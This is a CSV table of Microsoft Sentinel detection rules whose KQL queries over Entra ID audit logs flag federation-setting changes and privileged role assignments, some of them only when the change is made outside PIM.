,title,description,detectType,detectCon,detectLanguage,tags,attackTechnique,attackSoftware,references,pattern,dataSource,dataType,dataCollector,dataForwardTo,dataparser,dataParser,dataStorage,dataTable,dataIndex,dataAccess,dataMap,kqlVar,kqlTable,kqlQuery
1,,[None],,,,[None],,,[None],[None],,,,,,,,,,,,,,
2,rolemgt_pid_0001_any_global_admin,['user or app modifies federation settings in the tenant'],,3,kql,[None],['t1098.003'],,,,entra_id,['core_directory'],azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,directory_management,api_azure_monitor,,,AuditLogs,"| where OperationName =~ ""Set federation settings on domain""
  or OperationName =~ ""Set domain authentication"""
3,rolemgt_pid_0011_any_auth_extension_admin,"['Any Entra ID Auth Extension Admin Role Add, Remove, or Modify Activity', 'Customize sign in and sign up experiences for users by creating and managing custom authentication extensions']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '25a516ed-2fa0-40ea-a2d0-12923a21473a'"
4,rolemgt_pid_0053_any_security_reader,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can read security information and reports in Microsoft Entra ID and Office 365']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '5d6b6bb7-de71-4623-b4af-96380a352509'"
5,rolemgt_pid_0050_any_security_admin_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can read security information and reports, and manage configuration in Microsoft Entra ID and Office 365', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '194ae4cb-b126-40b2-bd5b-6091b380977d'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
6,rolemgt_pid_0046_any_priv_auth_admin_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can access to view, set and reset authentication method information for any user (admin or non-admin).', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '7be44c8a-adaf-4e2a-84d6-ab2649e08a13'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
7,rolemgt_pid_0020_any_cloudapp_admin_not_pim,"['Any Entra ID Cloud App Role Add, Remove, or Modify Activity', 'Can create and manage all aspects of app registrations and enterprise apps except application proxy', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '158c047a-c907-4556-b7ef-446551a6b5f7'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
8,rolemgt_pid_0012_any_auth_extension_admin_not_pim,"['Any Entra ID Auth Extension Admin Role Add, Remove, or Modify Activity', 'Customize sign in and sign up experiences for users by creating and managing custom authentication extensions', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '25a516ed-2fa0-40ea-a2d0-12923a21473a'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
9,rolemgt_pid_0049_any_security_operator,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Creates and manages security events.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '5f2222b1-57c3-48ba-8ad5-d4759f1fde6f'"
10,rolemgt_pid_0042_any_intune_admin_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can manage all aspects of the Intune product.', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '3a2c62db-5318-420d-8d74-23affee5d9d5'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
